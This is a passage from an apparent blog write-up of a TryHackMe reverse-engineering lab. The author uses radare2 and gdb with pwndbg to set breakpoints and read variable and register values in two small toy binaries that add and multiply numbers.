0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>OR</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">scp elfmceager@10.10.197.43:~/file1 .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">scp elfmceager@10.10.197.43:~/challenge1 .</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="practicing-with-file1">Practicing with file1<a href="#practicing-with-file1" class="hash-link" aria-label="Direct link to Practicing with file1" title="Direct link to Practicing with file1">​</a></h3><p>First we open the binary in radare2 debugging mode using this command: <code>r2 -d ./file1</code></p><p>Next, we ask r2 to analyse the program with <code>aa</code>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[0x00400a30]&gt; aa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[ WARNING : block size exceeding max block size at 0x006ba220</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Try changing it with e anal.bb.maxsize</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> WARNING : block size exceeding max block size at 0x006bc860</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Try changing it with e anal.bb.maxsize</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then, we can look for the main function and set a breakpoint.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[0x00400a30]&gt; afl | grep main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00400b4d    1 68           sym.main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00400e10   10 1007 -&gt; 219  sym.__libc_start_main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00403870   39 661  -&gt; 629  sym._nl_find_domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00403b10  308 5366 -&gt; 5301 sym._nl_load_domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00415fe0    1 43           sym._IO_switch_to_main_get_area</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0044cf00    1 8            sym._dl_get_dl_main_map</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00470520    1 49           sym._IO_switch_to_main_wget_area</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0048fae0    7 73   -&gt; 69   sym._nl_finddomain_subfreeres</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0048fb30   16 247  -&gt; 237  sym._nl_unload_domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[0x00400a30]&gt; pdf @main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            ;-- main:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/ (fcn) sym.main 68</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   sym.main ();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           ; var int local_ch @ rbp-0xc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           ; var int local_8h @ rbp-0x8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           ; var int local_4h @ rbp-0x4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|              ; DATA XREF from 0x00400a4d (entry0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b4d      55             push rbp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b4e      4889e5         mov rbp, rsp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b51      4883ec10       sub rsp, 0x10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b55      c745f4040000.  mov dword [local_ch], 4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b5c      c745f8050000.  mov dword [local_8h], 5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b63      8b55f4         mov edx, dword [local_ch]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b66      8b45f8         mov eax, dword [local_8h]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b69      01d0           add eax, edx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b6b      8945fc         mov dword [local_4h], eax</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b6e      8b4dfc         mov ecx, dword [local_4h]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b71      8b55f8         mov edx, dword [local_8h]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b74      8b45f4         mov eax, dword [local_ch]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b77      89c6           mov esi, eax</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b79      488d3d881409.  lea rdi, qword str.the_value_of_a_is__d__the_value_of_b_is__d_and_the_value_of_c_is__d ; 0x492008 ; &quot;the value of a is %d, the value of b is %d and the value of c is %d&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b80      b800000000     mov eax, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b85      e8f6ea0000     call sym.__printf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b8a      b800000000     mov eax, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           0x00400b8f      c9             leave</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">\           0x00400b90      c3             ret</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[0x00400a30]&gt; db 0x00400b55</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we run the program, we see we immediately hit the breakpoint</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[0x00400a30]&gt; dc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hit breakpoint at: 400b55</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can check on the value of <code>local_ch</code> before and after the &quot;<code>mov dword [local_ch], 4</code>&quot; instruction.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[0x00400b55]&gt; px @ rbp-0xc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1ba4  0000 0000 1890 6b00 0000 0000 7018 4000  ......k.....p.@.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1bb4  0000 0000 1911 4000 0000 0000 0000 0000  ......@.........</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1bc4  0000 0000 0000 0000 0100 0000 d81c ef4f  ...............O</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1bd4  fc7f 0000 4d0b 4000 0000 0000 0000 0000  ....M.@.........</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1be4  0000 0000 0600 0000 5500 0000 5000 0000  ........U...P...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1bf4  0400 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c04  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c14  0000 0000 0000 0000 0000 0000 0004 4000  ..............@.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c24  0000 0000 e9e8 fb41 e733 73ab 1019 4000  .......A.3s...@.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c34  0000 0000 0000 0000 0000 0000 1890 6b00  ..............k.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c44  0000 0000 0000 0000 0000 0000 e9e8 9b46  ...............F</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c54  b9ac 8b54 e9e8 8f50 e733 73ab 0000 0000  ...T...P.3s.....</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c64  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c74  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c84  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c94  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[0x00400b55]&gt; ds</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[0x00400b55]&gt; px @ rbp-0xc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1ba4  0400 0000 1890 6b00 0000 0000 7018 4000  ......k.....p.@.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1bb4  0000 0000 1911 4000 0000 0000 0000 0000  ......@.........</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1bc4  0000 0000 0000 0000 0100 0000 d81c ef4f  ...............O</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1bd4  fc7f 0000 4d0b 4000 0000 0000 0000 0000  ....M.@.........</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1be4  0000 0000 0600 0000 5500 0000 5000 0000  ........U...P...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1bf4  0400 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c04  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c14  0000 0000 0000 0000 0000 0000 0004 4000  ..............@.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c24  0000 0000 e9e8 fb41 e733 73ab 1019 4000  .......A.3s...@.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c34  0000 0000 0000 0000 0000 0000 1890 6b00  ..............k.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c44  0000 0000 0000 0000 0000 0000 e9e8 9b46  ...............F</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c54  b9ac 8b54 e9e8 8f50 e733 73ab 0000 0000  ...T...P.3s.....</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c64  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c74  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c84  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffc4fef1c94  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[0x00400b55]&gt; </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can see how the variable&#x27;s value has changed.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="moving-on-to-challenge1">Moving on to challenge1<a href="#moving-on-to-challenge1" class="hash-link" aria-label="Direct link to Moving on to challenge1" title="Direct link to Moving on to challenge1">​</a></h3><p>Well now that we know the basics of <code>radare2</code> (well I hope you do cause I don&#x27;t lol)...</p><p>So instead of using <code>radare2</code> to solve challenge1, I opted to use GDB with the pwndbg add-on.</p><p>However, I still needed to use <code>r2</code> to see what the questions were referring to.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           ; var int local_ch @ rbp-0xc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           ; var int local_8h @ rbp-0x8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           ; var int local_4h @ rbp-0x4</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now, let&#x27;s begin! Firstly, I started gdb using the following command:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day17-reverseelfneering$ gdb challenge1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then, I disassembled it to see the assembly code:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; disassemble main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Dump of assembler code for function main:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b4d &lt;+0&gt;:     push   rbp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b4e &lt;+1&gt;:     mov    rbp,rsp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b51 &lt;+4&gt;:     mov    DWORD PTR [rbp-0xc],0x1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b58 &lt;+11&gt;:    mov    DWORD PTR [rbp-0x8],0x6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b5f &lt;+18&gt;:    mov    eax,DWORD PTR [rbp-0xc]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b62 &lt;+21&gt;:    imul   eax,DWORD PTR [rbp-0x8]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b66 &lt;+25&gt;:    mov    DWORD PTR [rbp-0x4],eax</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b69 &lt;+28&gt;:    mov    eax,0x0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b6e &lt;+33&gt;:    pop    rbp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000400b6f &lt;+34&gt;:    ret    </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">End of assembler dump.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Lets set some breakpoints after the instructions we want to see the results of.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; break *0x0000000000400b58</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Breakpoint 1 at 0x400b58</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; break *0x0000000000400b66</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Breakpoint 2 at 0x400b66</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; break *0x0000000000400b69</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Breakpoint 3 at 0x400b69</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>When we hit <code>Breakpoint 1, 0x0000000000400b58 in main</code>, we examine the value of <code>rbp-0xc</code> (aka <code>local_ch</code>) and continue to program execution.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; x $rbp-0xc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7fffffffdf04: 0x00000001</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Continuing.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>When we hit <code>Breakpoint 2, 0x0000000000400b66 in main</code>, we look for the value of <code>eax</code> and continue the program execution.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; info registers eax</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">eax            0x6                 6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Continuing.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>When we hit <code>Breakpoint 3, 0x0000000000400b69 in main</code>, we look for the value of <code>rbp-0x4</code> (aka <code>local_4h</code>) and continue the program execution.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; x $rbp-0x4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7fffffffdf0c: 0x00000006</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwndbg&gt; c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Continuing.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then, we see that the program terminates:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[Inferior 1 (process 9100) exited normally]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Overall, we were able to answer all the questions.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-value-of-local_ch-when-its-corresponding-movl-instruction-is-called-first-if-multiple">What is the value of local_ch when its corresponding movl instruction is called (first if multiple)?<a href="#what-is-the-value-of-local_ch-when-its-corresponding-movl-instruction-is-called-first-if-multiple" class="hash-link" aria-label="Direct link to What is the value of 